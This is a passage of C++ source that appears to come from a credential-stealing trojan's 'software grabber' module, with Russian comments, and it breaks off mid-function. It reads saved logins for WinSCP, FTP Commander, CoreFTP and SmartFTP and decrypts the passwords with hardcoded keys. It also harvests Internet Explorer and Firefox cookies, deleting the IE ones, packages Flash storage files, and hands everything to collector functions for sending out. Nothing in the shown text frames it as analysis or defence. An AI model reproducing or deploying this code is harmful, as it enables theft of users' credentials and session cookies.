		if(pos + elen <= &buf[len] && elen >= hostAndUserSize)
		{
			if(buf[0] == 0xFF)
			{
				pos += hostAndUserSize;
				elen -= hostAndUserSize;
			}

			for(int i = 0; i < elen; i++)
				pass[i] = pos[i];
			pass[elen] = 0;

			return elen;
		}
	}

	return 0;
}

void _ftpWinScp(void)
{
	FTPDATA ftpData;
	Mem::_zero(&ftpData, sizeof(FTPDATA));

	const DWORD maxLogSize = MAX_ITEM_SIZE * 3 + 20;
	LPWSTR dataBuf = (LPWSTR)Mem::alloc(MAX_ITEM_SIZE * 3 * sizeof(WCHAR) + maxLogSize * sizeof(WCHAR));

	if(dataBuf != NULL)
	{
		HKEY rootKey;
		WCHAR name[MAX_PATH];
		const HKEY locs[] = {HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};

		LPWSTR host    = dataBuf;
		LPWSTR user    = host + MAX_ITEM_SIZE;
		LPWSTR pass    = user + MAX_ITEM_SIZE;
		LPWSTR output  = pass + MAX_ITEM_SIZE;

		CSTR_GETW(regKey,  softwaregrabber_winscp_regkey);
		CSTR_GETW(regHost, softwaregrabber_winscp_host);
		CSTR_GETW(regPort, softwaregrabber_winscp_port);
		CSTR_GETW(regUser, softwaregrabber_winscp_user);
		CSTR_GETW(regPass, softwaregrabber_winscp_pass);
		for(DWORD i = 0; i < sizeof(locs) / sizeof(HKEY); i++)
		{
			if(CWA(advapi32, RegOpenKeyExW)(locs[i], regKey, 0, KEY_ENUMERATE_SUB_KEYS, &rootKey) == ERROR_SUCCESS)
			{
				DWORD index = 0;
				DWORD size = MAX_PATH;
				DWORD userSize;
				DWORD hostSize;
				DWORD port;

				while(CWA(advapi32, RegEnumKeyExW)(rootKey, index++, name, &size, 0, NULL, NULL, NULL) == ERROR_SUCCESS)
				{
					if((hostSize = Registry::_getValueAsString(rootKey, name, regHost, host, MAX_ITEM_SIZE)) != (DWORD)-1 && hostSize > 0 &&
						(userSize = Registry::_getValueAsString(rootKey, name, regUser, user, MAX_ITEM_SIZE)) != (DWORD)-1 && userSize > 0 &&
						(size = Registry::_getValueAsString(rootKey, name, regPass, pass, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0 &&
						ftpWinScpDecrypt(pass, hostSize + userSize) > 0)
					{
						port = Registry::_getValueAsDword(rootKey, name, regPort);
						if(port < 1 || port > 0xFFFF)port = 21;
						CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format1W);
						int outputSize = Str::_sprintfW(output, maxLogSize, reportFormat, user, pass, host, port);
						if(outputSize > 0 && Str::_CatExW(&ftpData.list, output, outputSize))
							ftpData.count++;
					}
					size = MAX_PATH;
				}
				CWA(advapi32, RegCloseKey)(rootKey);
			}
		}
		Mem::free(dataBuf);
	}

	//FIXME: winscp.ini

	if(ftpData.count > 0)
		writeReport(ftpData.list, softwaregrabber_winscp_title, BLT_GRABBED_FTPSOFTWARE);
	else
		Mem::free(ftpData.list);
}


////////////////////////////////////////////////////////////////////////////////////////////////////
// FTP Commander
////////////////////////////////////////////////////////////////////////////////////////////////////

void ftpFtpCommanderMarkStringEnd(LPSTR string)
{
	LPSTR end = Str::_findCharA(string, ';');
	//Т.к. автор клиента идиот, это более менее сохранит данные верными.
	if(end != NULL)
	{
		while(end[1] == ';') end++; 
		*end = 0;
	}
}

/*
  Декруптор пароля.

  IN OUT pass    - пароль.

  Return         - размер пароля.
*/
static int ftpFtpCommanderDecrypt(LPSTR pass)
{
	//Автор клиента идиот.
	if((pass[0] == '0' || pass[0] == '1') && pass[1] == 0)
		return 0;

	int i = 0;
	for(; pass[i] != 0; i++)
		pass[i] ^= 0x19;
	return i;
}

bool ftpFtpCommanderProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);

/*
  Стандартный поиск.

  IN path        - путь.
  IN OUT ftpData - данные поиска.
*/
static void ftpFtpCommanderBasicSearch(LPWSTR path, FTPDATA *ftpData)
{
	CSTR_GETW(file1, softwaregrabber_fc_file_1);
	const LPWSTR files[] = {file1};
	Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES | Fs::FFFLAG_RECURSIVE, ftpFtpCommanderProc, ftpData, NULL, 0, 0);
}

static bool ftpFtpCommanderProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
	FTPDATA *ftpData = (FTPDATA *)data;
	WCHAR curPath[MAX_PATH];

	if(Fs::_pathCombine(curPath, path, (LPWSTR)fileInfo->cFileName))
	{
		WDEBUG("%s", curPath);
		if(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			ftpFtpCommanderBasicSearch(curPath, ftpData);
		else
		{      
			Fs::MEMFILE mf;
			if(Fs::_fileToMem(curPath, &mf, Fs::FTOMF_SHARE_WRITE))
			{
				LPBYTE data    = mf.data;
				LPBYTE dataEnd = data + mf.size;
				LPSTR *list;
				DWORD listSize = Str::_splitToStringsA((LPSTR)mf.data, mf.size, &list, Str::STS_TRIM, 0);

				if(listSize != (DWORD)-1)
				{
					const DWORD maxLogSize = MAX_ITEM_SIZE * 3 + 20;
					LPWSTR output = (LPWSTR)Mem::alloc(maxLogSize * sizeof(WCHAR));

					CSTR_GETA(valueHost, softwaregrabber_fc_host);
					CSTR_GETA(valuePort, softwaregrabber_fc_port);
					CSTR_GETA(valueUser, softwaregrabber_fc_user);
					CSTR_GETA(valuePass, softwaregrabber_fc_pass);
					if(output != NULL)for(DWORD i = 0; i < listSize; i++)if(list[i] != NULL)
					{
						LPSTR host = CWA(shlwapi, StrStrIA)(list[i], valueHost);
						LPSTR port = CWA(shlwapi, StrStrIA)(list[i], valuePort);
						LPSTR user = CWA(shlwapi, StrStrIA)(list[i], valueUser);
						LPSTR pass = CWA(shlwapi, StrStrIA)(list[i], valuePass);

						if(host != NULL && user != NULL && pass != NULL)
						{
							host += 8; user += 6; pass += 10;

							ftpFtpCommanderMarkStringEnd(host);              
							ftpFtpCommanderMarkStringEnd(user);
							ftpFtpCommanderMarkStringEnd(pass);

							DWORD portNum = 0;
							if(port != NULL)
							{
								port += 6;
								ftpFtpCommanderMarkStringEnd(port);
								portNum = Str::_ToInt32A(port, NULL);
							}
							if(portNum < 1 || portNum > 0xFFFF)
								portNum = 21;

							if(*host != 0 && *user != 0 && *pass != 0 && ftpFtpCommanderDecrypt(pass) > 0)
							{
								CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format1A);
								int outputSize = Str::_sprintfW(output, maxLogSize, reportFormat, user, pass, host, portNum);
								if(outputSize > 0 && Str::_CatExW(&ftpData->list, output, outputSize))
									ftpData->count++;
							}
						}
					}

					Mem::free(output);
					Mem::freeArrayOfPointers(list, listSize);
				}

				Fs::_closeMemFile(&mf);
			}
		}
	}
	return true;
}

void _ftpFtpCommander(void)
{
	CSTR_GETW(dir1, softwaregrabber_fc_path_mask_1);
	const DWORD locs[] = {CSIDL_PROGRAM_FILES, CSIDL_APPDATA, CSIDL_COMMON_APPDATA};
	const LPWSTR dirs[] = {dir1};
	WCHAR curPath[MAX_PATH];
	FTPDATA ftpData;

	Mem::_zero(&ftpData, sizeof(FTPDATA));

	for(DWORD i = 0; i < sizeof(locs) / sizeof(DWORD); i++)
		if(CWA(shell32, SHGetFolderPathW)(NULL, locs[i], NULL, SHGFP_TYPE_CURRENT, curPath) == S_OK) 
			Fs::_findFiles(curPath, dirs, sizeof(dirs) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FOLDERS, ftpFtpCommanderProc, &ftpData, NULL, 0, 0);

	if(ftpData.count > 0)
		writeReport(ftpData.list, softwaregrabber_fc_title, BLT_GRABBED_FTPSOFTWARE);
	else
		Mem::free(ftpData.list);
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// CoreFTP
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Декруптор пароля.

  IN OUT pass    - пароль.

  Return         - размер пароля.
*/
static int ftpCoreFtpDecrypt(LPWSTR pass)
{
	//FIXME:AES
	return Str::_LengthW(pass);
}

void _ftpCoreFtp(void)
{
	FTPDATA ftpData;
	Mem::_zero(&ftpData, sizeof(FTPDATA));

	const DWORD maxLogSize = MAX_ITEM_SIZE * 3 + 20;
	LPWSTR dataBuf = (LPWSTR)Mem::alloc(MAX_ITEM_SIZE * 3 * sizeof(WCHAR) + maxLogSize * sizeof(WCHAR));

	if(dataBuf != NULL)
	{
		HKEY rootKey;
		WCHAR name[MAX_PATH];
		const HKEY locs[] = {HKEY_CURRENT_USER};

		LPWSTR host    = dataBuf;
		LPWSTR user    = host + MAX_ITEM_SIZE;
		LPWSTR pass    = user + MAX_ITEM_SIZE;
		LPWSTR output  = pass + MAX_ITEM_SIZE;

		CSTR_GETW(regKey, softwaregrabber_coreftp_regkey);
		CSTR_GETW(valueHost, softwaregrabber_coreftp_host);
		CSTR_GETW(valuePort, softwaregrabber_coreftp_port);
		CSTR_GETW(valueUser, softwaregrabber_coreftp_user);
		CSTR_GETW(valuePass, softwaregrabber_coreftp_pass);

		for(DWORD i = 0; i < sizeof(locs) / sizeof(HKEY); i++)
		{
			if(CWA(advapi32, RegOpenKeyExW)(locs[i], regKey, 0, KEY_ENUMERATE_SUB_KEYS, &rootKey) == ERROR_SUCCESS)
			{
				DWORD index = 0;
				DWORD size = MAX_PATH;
				DWORD port;

				while(CWA(advapi32, RegEnumKeyExW)(rootKey, index++, name, &size, 0, NULL, NULL, NULL) == ERROR_SUCCESS)
				{
					if((size = Registry::_getValueAsString(rootKey, name, valueHost, host, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0 &&
						(size = Registry::_getValueAsString(rootKey, name, valueUser, user, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0 &&
						(size = Registry::_getValueAsString(rootKey, name, valuePass, pass, MAX_ITEM_SIZE)) != (DWORD)-1 && size > 0 &&
						ftpCoreFtpDecrypt(pass) > 0)
					{
						port = Registry::_getValueAsDword(rootKey, name, valuePort);
						if(port < 1 || port > 0xFFFF)
							port = 21;

						CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format1W);
						int outputSize = Str::_sprintfW(output, maxLogSize, reportFormat, user, pass, host, port);
						if(outputSize > 0 && Str::_CatExW(&ftpData.list, output, outputSize))
							ftpData.count++;
					}
					size = MAX_PATH;
				}
				CWA(advapi32, RegCloseKey)(rootKey);
			}
		}

		Mem::free(dataBuf);

		//FIXME: coreftp.cfg

		if(ftpData.count > 0)
			writeReport(ftpData.list, softwaregrabber_coreftp_title, BLT_GRABBED_FTPSOFTWARE);
		else
			Mem::free(ftpData.list);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// SmartFTP
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Декруптор пароля.

  IN OUT pass - пароль.

  Return      - размер пароля.
*/
static int ftpSmartFtpDecrypt(LPWSTR pass)
{
	const WCHAR hardcode[] = {0xE722, 0xF62F, 0xB67C, 0xDD5A, 0x0FDB, 0xB94E, 0x5196, 0xE040, 0xF694, 0xABE2, 0x21BB, 0xFC08, 0xE48E, 0xB96A, 0x55D7, 0xA6E5, 0xA4A1, 0x2172, 0x822D, 0x29EC,
		0x57E4, 0x1458, 0x04D1, 0x9DC1, 0x7020, 0xFC6A, 0xED8F, 0xEFBA, 0x8E88, 0xD689, 0xD18E, 0x8740, 0xA6DE, 0x8e01, 0x3AC2, 0x6871, 0xEE11, 0x8C2A, 0x5FC1, 0x337F,
		0x6D32, 0xD471, 0x7DC9, 0x0cD9, 0x5071, 0xA094, 0x1605, 0x6FD7, 0x3638, 0x4FFD, 0xB3B2, 0x9717, 0xBECA, 0x721C, 0x623F, 0x068F, 0x698F, 0x7FFF, 0xE29C, 0x27E8,
		0x7189, 0x4939, 0xDB4E, 0xC3FD, 0x8F8B, 0xF4EE, 0x9395, 0x6B1A, 0xD1B1, 0x0F6A, 0x4D8B, 0xA696, 0xA79D, 0xBB9E, 0x00DF, 0x093C, 0x856F, 0xB51C, 0xF1C5, 0xE83D,
		0x393A, 0x03D1, 0x68D8, 0x9659, 0xF791, 0xB2C2, 0x0234, 0x9B5C, 0xB1BF, 0x72EB, 0xDABA, 0xF1C5, 0xDA01, 0xF047, 0x3DD8, 0x72AB, 0x784C, 0x0077, 0xB05F, 0xA245,
		0x1794, 0x16D9, 0xC6C6, 0xFFA2, 0xF099, 0x3D88, 0xA624, 0xDE3D, 0xD35B, 0x82B3, 0x7E9C, 0xF406, 0x1608, 0x07AA, 0xF97E, 0x373A, 0xC441, 0x15B0, 0xB699, 0xF81C,
		0xE38F, 0xCB97};
	WCHAR buf[sizeof(hardcode) / sizeof(WCHAR) + 1/*safebyte*/];

	int len = Str::_LengthW(pass) / 4;
	if(len < (sizeof(buf) / sizeof(WCHAR)) && Str::_fromHexW(pass, buf))
	{
		for(int i = 0; i < len; i++)
		{
			WORD sw = SWAP_WORD(buf[i]);
			sw ^= hardcode[i];
			pass[i] = SWAP_WORD(sw);
		}
		pass[len] = 0;
		return len;
	}
	return 0;
}

bool ftpSmartFtpProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);

/*
  Стандартный поиск.

  IN path        - путь.
  IN OUT ftpData - данные поиска.
*/
static void ftpSmartFtpBasicSearch(LPWSTR path, FTPDATA *ftpData)
{
	CSTR_GETW(file1, softwaregrabber_smartftp_file_mask_1);
	const LPWSTR files[] = {file1};
	Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES | Fs::FFFLAG_RECURSIVE, ftpSmartFtpProc, ftpData, NULL, 0, 0);
}

static bool ftpSmartFtpProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
	FTPDATA *ftpData = (FTPDATA *)data;
	WCHAR curPath[MAX_PATH];

	if(Fs::_pathCombine(curPath, path, (LPWSTR)fileInfo->cFileName))
	{
		WDEBUG("%s", curPath);
		if(fileInfo->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			ftpSmartFtpBasicSearch(curPath, ftpData);
		else
		{      
			IXMLDOMDocument *doc = XmlParser::_openFile(curPath, NULL);
			if(doc != NULL)
			{
				IXMLDOMElement *root;
				if(doc->get_documentElement(&root) == S_OK)
				{
					BSTR rootName;
					if(root->get_nodeName(&rootName) == S_OK)
					{
						if(CSTR_EQW(rootName, softwaregrabber_smartftp_node))
						{
							BSTR host;
							BSTR port;
							BSTR user;
							BSTR pass;

							{
								CSTR_GETW(nodeHost, softwaregrabber_smartftp_host);
								host = XmlParser::_getNodeTextOfElement(root, nodeHost);
							}
							{
								CSTR_GETW(nodePort, softwaregrabber_smartftp_port);
								port = XmlParser::_getNodeTextOfElement(root, nodePort);
							}
							{
								CSTR_GETW(nodeUser, softwaregrabber_smartftp_user);
								user = XmlParser::_getNodeTextOfElement(root, nodeUser);
							}
							{
								CSTR_GETW(nodePass, softwaregrabber_smartftp_pass);
								pass = XmlParser::_getNodeTextOfElement(root, nodePass);
							}

							if(host != NULL && *host != 0 && user != NULL && *user != 0 && pass != NULL && ftpSmartFtpDecrypt(pass) > 0)
							{
								DWORD portInt = port != NULL ? Str::_ToInt32W(port, NULL) : 0;
								if(portInt < 1 || portInt > 0xFFFF)
									portInt = 21;

								LPWSTR output = NULL;
								CSTR_GETW(reportFormat, softwaregrabber_ftp_report_format1W);
								int outputSize = Str::_sprintfExW(&output, reportFormat, user, pass, host, portInt);
								if(outputSize > 0 && Str::_CatExW(&ftpData->list, output, outputSize))
									ftpData->count++;
								Mem::free(output);
							}

							XmlParser::_freeBstr(host);
							XmlParser::_freeBstr(port);
							XmlParser::_freeBstr(user);
							XmlParser::_freeBstr(pass);
						}
						XmlParser::_freeBstr(rootName);
					}
					root->Release();
				}
				doc->Release();
			}
		}
	}
	return true;
}

void _ftpSmartFtp(void)
{
	WCHAR inPath[MAX_PATH];
	WCHAR curPath[MAX_PATH];
	FTPDATA ftpData;
	DWORD size;

	Mem::_zero(&ftpData, sizeof(FTPDATA));

	{
		CSTR_GETW(regKey1,   softwaregrabber_smartftp_regkey_1);
		CSTR_GETW(regKey2,   softwaregrabber_smartftp_regkey_2);
		CSTR_GETW(regValue1, softwaregrabber_smartftp_regvalue_1);
		CSTR_GETW(regValue2, softwaregrabber_smartftp_regvalue_2);

		const LPWSTR keys[]   = {regKey1, regKey2};
		const LPWSTR values[] = {regValue1, regValue2};

		for(BYTE i = 0; i < sizeof(keys) / sizeof(LPWSTR); i++)
		{
			if((size = Registry::_getValueAsString(HKEY_CURRENT_USER, keys[i], values[i], inPath, MAX_PATH)) != (DWORD)-1 && size > 0)
			{
				CWA(kernel32, ExpandEnvironmentStringsW)(inPath, curPath, MAX_PATH);
				ftpSmartFtpBasicSearch(curPath, &ftpData);
			}
		}
	}

	if(ftpData.count > 0)
		writeReport(ftpData.list, softwaregrabber_smartftp_title, BLT_GRABBED_FTPSOFTWARE);
	else
		Mem::free(ftpData.list);
}

enum
{
	COOKIESFLAG_DELETE = 0x1, //Удалить куки.
	COOKIESFLAG_SAVE   = 0x2  //Сохранить куки.
};

//Размер буфера для INTERNET_CACHE_ENTRY_INFOW.
#define WININETCOOKIE_BUFFER_SIZE (sizeof(INTERNET_CACHE_ENTRY_INFOW) + INTERNET_MAX_URL_LENGTH * sizeof(WCHAR) + MAX_PATH * sizeof(WCHAR))

/*
	Чтение кука Wininet из файла.

	IN fileName - имя файла.

	Return      - данные кука(удалит через Mem), или NULL - в случаи ошибки.
*/
static LPSTR __inline parseWininetCookies(LPWSTR fileName)
{
	Fs::MEMFILE mf;
	LPSTR output = NULL;

	if(Fs::_fileToMem(fileName, &mf, 0))
	{
		LPSTR *list;
		DWORD listCount = Str::_splitToStringsA((LPSTR)mf.data, mf.size, &list, Str::STS_TRIM, 0);
		Fs::_closeMemFile(&mf);

		if(listCount != (DWORD)-1)
		{
			if(listCount % 9 == 0)
			{
				char reportPathFormat[] = "\nPath: %s\n";
				char reportFormat[] = "%s=%s\n";

				LPSTR prevPath = NULL, path, name, value;
				char buf[INTERNET_MAX_URL_LENGTH + 20];
				int bufSize;

				for(DWORD i = 0; i < listCount; i += 9)
				{
					//Получем значения.
					if((name  = list[i + 0]) == NULL || *name  == 0 ||
						(value = list[i + 1]) == NULL || *value == 0 ||
						(path  = list[i + 2]) == NULL || *path  == 0)
					{
						//Нервеный формат.
						Mem::free(output);
						output = NULL;
						break;
					}

					//Добавление пути. 
					if(Str::_CompareA(prevPath, path, -1, -1) != 0)
					{
						bufSize = Str::_sprintfA(buf, sizeof(buf), reportPathFormat, path);
						if(bufSize == -1 || !Str::_CatExA(&output, buf, bufSize)){output = NULL; break;}
					}

					//Добовление кука.
					{
						bufSize = Str::_sprintfA(buf, sizeof(buf), reportFormat, name, value);
						if(bufSize == -1 || !Str::_CatExA(&output, buf, bufSize)){output = NULL; break;}
					}

					prevPath = path;
				}
			}

			Mem::freeArrayOfPointers(list, listCount);
		}
	}
	return output;
}

typedef struct
{
	DWORD flags;
	LPSTR list;
	DWORD listSize;
}WININETCOOKIESPROCFINDDATA;

/*
	Кэлбэк Fs::_findFiles().
*/
static bool wininetCookiesFindProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data)
{
	WININETCOOKIESPROCFINDDATA *wcpfd = (WININETCOOKIESPROCFINDDATA *)data;
	WCHAR file[MAX_PATH];

	if(Fs::_pathCombine(file, path, (LPWSTR)fileInfo->cFileName))
	{
		if(wcpfd->flags & COOKIESFLAG_SAVE)
		{
			LPSTR curCookie = parseWininetCookies(file);
			if(curCookie != NULL)
			{
				DWORD curCookieSize = Str::_LengthA(curCookie);
				if(Mem::reallocEx(&wcpfd->list, wcpfd->listSize + curCookieSize))
				{
					Mem::_copy(wcpfd->list + wcpfd->listSize, curCookie, curCookieSize);
					wcpfd->listSize += curCookieSize;
				}
				Mem::free(curCookie);
			}
		}

		if(wcpfd->flags & COOKIESFLAG_DELETE)
		{
			Fs::_removeFile(file);
		}
	}
	return true;
}

/*
	Обработка куков Wininet.

	IN flags     - флаги COOKIESFLAG_*.
	OUT list     - полный список куков.
	OUT listSize - размер списка куков.
*/
static void wininetCookiesProc(DWORD flags, LPSTR *list, LPDWORD listSize)
{
	WCHAR mask1[] = L"*@*.txt";
	const LPWSTR mask[] = {mask1};

	WININETCOOKIESPROCFINDDATA wcpfd;
	wcpfd.flags    = flags;
	wcpfd.list     = NULL;
	wcpfd.listSize = 0;

	WCHAR path[MAX_PATH];
	if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_COOKIES, NULL, SHGFP_TYPE_CURRENT, path) == S_OK)
	{

		Fs::_findFiles(path, mask, sizeof(mask) / sizeof(LPWSTR), Fs::FFFLAG_SEARCH_FILES | Fs::FFFLAG_RECURSIVE, wininetCookiesFindProc, &wcpfd, NULL, 10, 10);
	}

	if(flags & COOKIESFLAG_SAVE)
	{
		*list     = wcpfd.list;
		*listSize = wcpfd.listSize;
	}
}

void getIECookies(void)
{
	LPSTR cookies; LPWSTR cookiesW = NULL;
	DWORD cookiesSize;

	//Получаем куки.
	wininetCookiesProc(COOKIESFLAG_SAVE | COOKIESFLAG_DELETE, &cookies, &cookiesSize);
	if(cookiesSize == 0)cookies = NULL;
	else cookiesW = Str::_ansiToUnicodeEx(cookies, -1);

	//Пишим лог.
	if(cookiesW)
	{
		LPWSTR report;
		WCHAR header[] = L"Wininet(Internet Explorer) cookies:\n%S";
		int r = Str::_sprintfExW(&report, header, cookiesW);
		if(r > 0) g_GateToCollector3(BLT_COOKIES, 0, report, r);
		Mem::free(report);
	}
	Mem::free(cookies);
	Mem::free(cookiesW);
}

//FF Cookies
typedef struct sqlite3 sqlite3;

typedef int (__cdecl *Tsqlite3_open16)(
  const void *filename,   /* Database filename (UTF-8) */
  sqlite3 **ppDb          /* OUT: SQLite db handle */
);

typedef int (__cdecl *Tsqlite3_exec)(
  sqlite3*,                                  /* An open database */
  const char *sql,                           /* SQL to be evaluated */
  int (__cdecl *callback)(void*,int,char**,char**),  /* Callback function */
  void *,                                    /* 1st argument to callback */
  char **errmsg                              /* Error msg written here */
);

typedef void (__cdecl *Tsqlite3_free)(void*);

typedef int (__cdecl *Tsqlite3_close)(sqlite3 *);

struct FFCookiesData
{
	Tsqlite3_free sqlite3_free;
	Tsqlite3_close sqlite3_close;
	Tsqlite3_exec sqlite3_exec;
	Tsqlite3_open16 sqlite3_open16;
	HMODULE mozsqlite3;
	HMODULE msvcrt;
	HMODULE mozglue;
	LPSTR Cookies;
	DWORD CookiesSize;
};

bool Sqlite3FunctionsInit(FFCookiesData* table)
{
	WCHAR path[MAX_PATH];
	if((SHGetFolderPathW(0, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, path) == S_OK) && Fs::_pathCombine(path, path, L"\\Mozilla Firefox"))
	{
		HMODULE msvcrt = LoadLibraryW(L"MSVCR100.dll");
		HMODULE mozglue;
		{
			WCHAR mozglue_path[MAX_PATH];
			Fs::_pathCombine(mozglue_path, path, L"mozglue.dll");
			mozglue = LoadLibraryW(mozglue_path);
		}
		HMODULE mozsqlite3;
		{
			WCHAR mozsqlite3_path[MAX_PATH];
			Fs::_pathCombine(mozsqlite3_path, path, L"mozsqlite3.dll");
			mozsqlite3 = LoadLibraryW(mozsqlite3_path);
		}
		WDEBUG("mozglue.dll = 0x%X\r\nmozsqlite3.dll = 0x%X\r\nMSVCR100.dll = 0x%X", mozglue, mozsqlite3, msvcrt);
		if(mozsqlite3 && !IsBadWritePtr(table, sizeof(FFCookiesData)))
		{
			table->sqlite3_close = (Tsqlite3_close)CWA(kernel32, GetProcAddress)(mozsqlite3, "sqlite3_close");
			table->sqlite3_exec = (Tsqlite3_exec)CWA(kernel32, GetProcAddress)(mozsqlite3, "sqlite3_exec");
			table->sqlite3_free = (Tsqlite3_free)CWA(kernel32, GetProcAddress)(mozsqlite3, "sqlite3_free");
			table->sqlite3_open16 = (Tsqlite3_open16)CWA(kernel32, GetProcAddress)(mozsqlite3, "sqlite3_open16");
			table->mozsqlite3 = mozsqlite3;
			table->msvcrt = msvcrt;
			table->mozglue = mozglue;
			return true;
		}
		else
			WDEBUG("Can't load mozsqlite3.dll, LE: 0x%X", GetLastError());
	}
	else WDEBUG("Can't merge paths '%s' and '%s'", path, L"\\Mozilla Firefox\\mozsqlite3.dll");
	return false;
}

typedef bool (ENUMPROFILESPROC)(const LPWSTR path, void *param);

static void enumProfiles(ENUMPROFILESPROC proc, void *param)
{
	//Получем домашнию директорию.
	WCHAR firefoxHome[MAX_PATH];
	WCHAR firefoxPath[] = L"Mozilla\\Firefox";
	if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, firefoxHome) == S_OK && Fs::_pathCombine(firefoxHome, firefoxHome, firefoxPath))
	{
		//Получаем список профилей.
		WCHAR profilesFile[MAX_PATH];

		WCHAR profilesBaseName[] = L"profiles.ini";
		if(Fs::_pathCombine(profilesFile, firefoxHome, profilesBaseName) && CWA(kernel32, GetFileAttributesW)(profilesFile) != INVALID_FILE_ATTRIBUTES)
		{
			WCHAR section[10];
			WCHAR profilePath[MAX_PATH];
			UINT isRelative;

			WCHAR keyProfileIdFormat[] = L"Profile%u";
			WCHAR keyProfileRelative[] = L"IsRelative";
			WCHAR keyProfilePath[] = L"Path";

			for(BYTE i = 0; i < 250; i++)
			{
				//Получаем данные текущего профиля.
				if(Str::_sprintfW(section, sizeof(section) / sizeof(WCHAR), keyProfileIdFormat, i) < 1 ||
					(isRelative = CWA(kernel32, GetPrivateProfileIntW)(section, keyProfileRelative, (INT)(UINT)-1, profilesFile)) == (UINT)-1
					)break;

				if(CWA(kernel32, GetPrivateProfileStringW)(section, keyProfilePath, NULL, profilePath, sizeof(profilePath) / sizeof(WCHAR), profilesFile) == 0)continue;
				Fs::_normalizeSlashes(profilePath);

				//Вызываем кээлбэк.
				if(isRelative == 1) //Именно жестоко 1, согласно коду firefox.
				{
					WCHAR fullPath[MAX_PATH];
					if(Fs::_pathCombine(fullPath, firefoxHome, profilePath) && !proc(fullPath, param))break;
				}
				else
				{
					if(!proc(profilePath, param))break;
				}
			}
		}
	}
}

static int __cdecl callback(void *pointer, int coln, char **rows, char **colnm)
{
	FFCookiesData* table = (FFCookiesData*)pointer;
	if(coln == 3)
	{
		char format[] = "%s\nPath: %s\n%s=%s\n";
		table->CookiesSize = Str::_sprintfExA(&table->Cookies, format, table->Cookies, rows[0], rows[1], rows[2]);
	}

	return 0;
}

static bool enumProfilesForCookies(const LPWSTR path, void *param)
{
	FFCookiesData* funcs = (FFCookiesData*)param;

	bool ok = false;
	WCHAR CookiesFile[MAX_PATH];
	WCHAR CookiesBaseName[] = L"cookies.sqlite";

	if(Fs::_pathCombine(CookiesFile, path, CookiesBaseName))
	{
		WCHAR tempFile[MAX_PATH];
		if(Fs::_createTempFile(NULL, tempFile))
		{
			 ok = CWA(kernel32, CopyFileW)(CookiesFile, tempFile, false);
			 WDEBUG("CopyFileW(\"%s\", \"%s\") == %u", CookiesFile, tempFile, ok);
			 sqlite3 *db = 0;
			 if(funcs->sqlite3_open16(tempFile, &db) == 0 /* #define SQLITE_OK 0*/ )
			 {
				 char CookiesQuery[] = "SELECT baseDomain,name,value FROM moz_cookies;";
				 char *err = 0;
				 if(funcs->sqlite3_exec(db, CookiesQuery, callback, param, &err))
				 {
					funcs->sqlite3_free(err);
				 }
				 else WDEBUG("sqlite3_exec failed. %s", Str::_ansiToUnicodeEx(err, -1));
				 funcs->sqlite3_close(db);
			 }
			 else
				 WDEBUG("sqlite3_open16 failed.");
			 if(ok) Fs::_removeFile(tempFile);
		}
	}
	return true;
}

void getFFCookies(void)
{
	FFCookiesData cd;
	if(Sqlite3FunctionsInit(&cd))
	{
		enumProfiles(enumProfilesForCookies, &cd);
		LPWSTR CookiesW;
		if(cd.CookiesSize > 0 && (CookiesW = Str::_ansiToUnicodeEx(cd.Cookies, cd.CookiesSize)))
		{
			g_GateToCollector3(BLT_COOKIES, 0, CookiesW, cd.CookiesSize);
			Mem::free(CookiesW);
			Mem::free(cd.Cookies);
			FreeLibrary(cd.mozsqlite3);
			FreeLibrary(cd.msvcrt);
			FreeLibrary(cd.mozglue);
		}
		else WDEBUG("FF Cookies not found.");
	}
}

static bool getFlashPlayerPath(LPWSTR path)
{
	CSTR_GETW(home, softwaregrabber_flashplayer_path);
	return (CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, path) == S_OK && Fs::_pathCombine(path, path, home));
}

static void _writeFolderAsArchive(LPWSTR path, LPWSTR *fileMask, DWORD fileMaskCount, LPWSTR destPath, DWORD flags)
{
	bool retVal = false;
	WCHAR tmpFile[MAX_PATH];

	if(Fs::_createTempFile(L"bc", tmpFile) && Fs::_removeFile(tmpFile) && MsCab::createFromFolder(tmpFile, path, NULL, fileMask, fileMaskCount, flags))
	{
		Fs::MEMFILE cab;
		if(Fs::_fileToMem(tmpFile, &cab, 0))
		{
			g_WriteData(BLT_FILE, destPath, cab.data, cab.size);
			Fs::_closeMemFile(&cab);
		}
		Fs::_removeFile(tmpFile);
	}
}

void _getMacromediaFlashFiles(void)
{
	WDEBUG("Exporing the sol-files.");

	CSTR_GETW(mask1, softwaregrabber_flashplayer_mask);
	const LPWSTR mask[] = {mask1};

	WCHAR path[MAX_PATH];
	CSTR_GETW(file, softwaregrabber_flashplayer_archive);
	if(getFlashPlayerPath(path))
		_writeFolderAsArchive(path, (LPWSTR *)mask, sizeof(mask) / sizeof(LPWSTR), file, MsCab::CFF_RECURSE);
}

void _removeMacromediaFlashFiles(void)
{
	WCHAR path[MAX_PATH];

	WDEBUG("Removing the sol-files.");
	if(getFlashPlayerPath(path))
